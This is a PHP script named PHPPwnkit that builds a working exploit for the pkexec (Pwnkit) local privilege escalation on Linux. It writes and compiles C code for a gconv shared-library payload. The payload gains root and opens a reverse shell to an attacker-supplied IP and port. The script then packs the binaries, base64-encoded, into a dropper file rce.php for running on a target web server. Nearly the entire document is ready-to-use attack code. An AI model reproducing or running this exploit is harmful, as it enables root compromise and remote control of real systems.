<?php

/*
Author : Vincent Fourcade Digitemis
Mail : vincent.fourcade@digitemis.com
Name : PHPPwnkit
*/



if(empty($argv[1])) :
  echo "Usage : \n";
  echo "php PHPPwnkit.php IP_SOURCE PORT_ECOUTE";
  die();
endif;
$ip   = $argv[1];
$port = $argv[2];

$mainC = '#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main(int argc, char *argv[]) {
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}';

$payloadC = '#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

	#define REMOTE_ADDR "'.$ip.'"
	#define REMOTE_PORT '.$port.'
	void gconv() {}
	void gconv_init() {
		setuid(0); setgid(0);
		seteuid(0); setegid(0);
		system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf \'GCONV_PATH=.\' \'pwnkit\';");
	struct sockaddr_in sa;
	int s;
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
	sa.sin_port = htons(REMOTE_PORT);
	s = socket(AF_INET, SOCK_STREAM, 0);
	connect(s, (struct sockaddr *)&sa, sizeof(sa));
	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	execve("/bin/sh", 0, 0);
		exit(0);
}
';

$handle =  fopen("main.c", "wb");
fwrite($handle, $mainC);
fclose($handle);

$handle =  fopen("payload.c", "wb");
fwrite($handle, $payloadC);
fclose($handle);

$cmdPayload = "gcc payload.c  -o pwnkit.so -shared -fPIC; rm payload.c";
$cmdMain    = "gcc -o main main.c; rm main.c";

shell_exec($cmdPayload);
shell_exec($cmdMain);

$main64 =  base64_encode(file_get_contents("main"));
shell_exec("rm main");

$pwnkitSo64 =  base64_encode(file_get_contents("pwnkit.so"));
shell_exec("rm pwnkit.so");

$PHPPayload = '<?php
$exec_payload = base64_decode(b"'.$main64.'");
$payload =base64_decode(b"'.$pwnkitSo64.'");

shell_exec("mkdir -p \'GCONV_PATH=.\'; touch \'GCONV_PATH=./pwnkit\'; chmod a+x \'GCONV_PATH=./pwnkit\'");
shell_exec("mkdir -p pwnkit; echo \'module UTF-8// PWNKIT// pwnkit 2\' > pwnkit/gconv-modules");

$fp = fopen("pwnkit/pwnkit.so", \'wb\');
fwrite($fp, $payload);
fclose($fp);
chmod("pwnkit/pwnkit.so", 0755);

$fp = fopen("execution", \'wb\');
fwrite($fp, $exec_payload);
fclose($fp);
chmod("execution", 0755);
echo "execution";
shell_exec("./execution");
shell_exec("rm execution");
?>';

$fp = fopen("rce.php", 'wb');
fwrite($fp, $PHPPayload);
fclose($fp);
?>
